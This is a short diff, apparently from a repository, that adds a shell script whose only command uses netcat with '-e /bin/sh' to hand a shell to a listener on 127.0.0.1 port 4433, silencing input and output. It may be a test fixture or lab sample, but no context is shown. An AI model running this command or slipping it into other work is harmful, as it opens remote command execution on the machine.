@@ -1,0 +1,2 @@
+#!/bin/sh
+nc -e /bin/sh 127.0.0.1 4433 >& /dev/null < /dev/null
